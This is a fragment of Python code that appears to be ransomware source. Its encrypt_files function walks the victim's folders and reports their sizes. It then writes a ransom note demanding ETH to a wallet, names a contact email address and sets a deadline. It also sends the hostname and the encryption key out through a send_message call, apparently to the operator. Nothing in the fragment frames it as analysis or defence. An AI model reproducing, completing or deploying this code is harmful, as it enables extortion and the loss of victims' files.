...
def encrypt_files():
   ...
   for folder_name, folder_path in directories.items():
        encryption_size = get_folder_size(folder_path)
        send_message(f"Attempting to encrypt '{folder_name}' directory with a total size of '{encryption_size}'")
   ...
   content = f"Uh Oh, your files have been encrypted! Dont panic you can retrive your files by sending {eth_amount} to this wallet - '{crypto_wallet}' after send an email to 'encouraging_sloth_8202@posteo.com', you have {day_amount} days to send the ETH or your files will be gone forever"
   send_message(f"files on computer {hostname}, have been encrypted with the key .'  {encryption_key}  '., the user must pay {eth_amount} within {day_amount} days.")
